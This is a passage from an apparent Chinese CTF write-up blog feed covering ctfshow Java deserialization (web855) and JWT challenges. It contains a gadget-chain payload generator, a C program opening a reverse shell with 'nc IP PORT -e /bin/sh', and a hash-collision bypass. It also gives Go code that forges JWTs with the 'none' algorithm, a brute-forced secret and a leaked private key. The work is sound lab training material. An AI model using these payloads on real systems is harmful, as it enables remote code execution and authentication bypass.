constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>defaultedMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">ObjectexpHashMap</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DualLinkedHashBidiMap</span> dualLinkedHashBidiMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DualLinkedHashBidiMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> reverseMap <span class="token operator">=</span> <span class="token class-name">DualLinkedHashBidiMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"normalMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        reverseMap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        reverseMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>dualLinkedHashBidiMap<span class="token punctuation">,</span> expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>dualLinkedHashBidiMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9-web855"><a href="#9-web855" class="headerlink" title="9. web855"></a>9. web855</h2><ul><li>题目描述</li></ul><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java8，没有使用额外的库</p><p>我有一个User类，代码如下:</p><p>下面是我接收参数的代码<br><code>?data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p><ul><li>题目解析</li></ul><p>先阅读一下 readObject()，这里分为了两个部分</p><p><img src="/../../../pic/image-20230130033733804.png"></p><p>向一个文件中写入文件并且规定了文件头为 7f454c46，这是一个 ELF 的文件头，也就是说我们可以传入一个可执行的文件</p><p>接着看第二部分</p><p><img src="/../../../pic/image-20230130033930351.png"></p><p>简单一点就是要求传入的 username 值与 password 值与规定的内容不能相同，但是要求 User 类的比对下相同，而 User 类是通过获取 hashCode 进行判断，这里可以通过 hash 碰撞绕过</p><p>然后执行不可控的命令</p><p><img src="/../../../pic/image-20230130034242021.png"></p><p>命令也很简单，为文件加上可执行权限然后执行，结合第一部分的文件写入就可以实现写入并且执行恶意文件</p><p>首先先生成一个恶意文件</p><p>helloworld.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token expression"><span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nc IP PORT -e /bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc helloworld.c <span class="token parameter variable">-o</span> helloworld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来需要绕过前面几个 if，在 User 中重写下 writeObject</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        out<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">2135247942</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"F:/helloworld"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230130035633226.png"></p><p>然后序列化一下 User 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">,</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以在本地执行反序列化测试一下文件是否可用</p><p>接下来就是去进行 hash 碰撞，使用 golang 语言</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"strconv"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>hashList <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token string">"ct"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token string">"12"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> hashList <span class="token punctuation">{</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">for</span> j <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> j<span class="token operator">++</span> <span class="token punctuation">{</span>value <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token function">byte</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token function">byte</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> v <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"---------"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">hashCode</span><span class="token punctuation">(</span>origin <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>result <span class="token operator">:=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>result <span class="token operator">=</span> <span class="token number">31</span><span class="token operator">*</span>result <span class="token operator">+</span> <span class="token function">int</span><span class="token punctuation">(</span>origin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得结果</p><p><img src="/../../../pic/image-20230130041815417.png"></p><p>修改下 User 下的 writeObject</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    out<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">2135247942</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成 payload</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"dUfshow"</span><span class="token punctuation">,</span> <span class="token string">"0Q3456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - JWT</title>
      <link href="/2023/01/26/catchtheflag/ctf-xiu/ctf-xiu-jwt/"/>
      <url>/2023/01/26/catchtheflag/ctf-xiu/ctf-xiu-jwt/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-JWT"><a href="#CTF-秀-JWT" class="headerlink" title="CTF 秀 - JWT"></a>CTF 秀 - JWT</h1><h2 id="1-web346"><a href="#1-web346" class="headerlink" title="1. web346"></a>1. web346</h2><p>截取到 Cookie</p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3MTIwNjczNCwiZXhwIjoxNjcxMjEzOTM0LCJuYmYiOjE2NzEyMDY3MzQsInN1YiI6InVzZXIiLCJqdGkiOiJkOWE0MjY2ZWFkNTdlMDVhOTVhMGZmY2Q4YzY4MDRhMCJ9.fkNrufgSluvTVoU_66km1gmluRWo06D1HWi6wtujHqs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码后获得</p><pre class="line-numbers language-none"><code class="language-none">{    "header": {        "alg": "HS256",        "typ": "JWT"    },    "payload": {        "iss": "admin",        "iat": 1671206734,        "exp": 1671213934,        "nbf": 1671206734,        "sub": "user",        "jti": "d9a4266ead57e05a95a0ffcd8c6804a0"    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用空加密绕过</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1671206734</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1671213934</span><span class="token punctuation">,</span><span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1671206734</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"d9a4266ead57e05a95a0ffcd8c6804a0"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodNone<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SigningString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-web347"><a href="#2-web347" class="headerlink" title="2. web347"></a>2. web347</h2><p>使用空加密绕过失败，爆破一手秘钥</p><p><img src="/../../../pic/Pasted%20image%2020221217001112.png"></p><p>获得秘钥为 123456</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>SECRET_KEY <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1671206734</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1671213934</span><span class="token punctuation">,</span><span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1671206734</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"d9a4266ead57e05a95a0ffcd8c6804a0"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-web348"><a href="#3-web348" class="headerlink" title="3. web348"></a>3. web348</h2><p>同样是暴力破解</p><p><img src="/../../../pic/Pasted%20image%2020221217001613.png"></p><h2 id="4-web349"><a href="#4-web349" class="headerlink" title="4. web349"></a>4. web349</h2><p>查看源码获得公私钥地址，访问 <code>private.key</code> 与 <code>public.key</code> 获得公私钥</p><p>使用私钥生成即可</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>PRIVATE_KEY <span class="token operator">=</span> <span class="token string">"-----BEGIN RSA PRIVATE 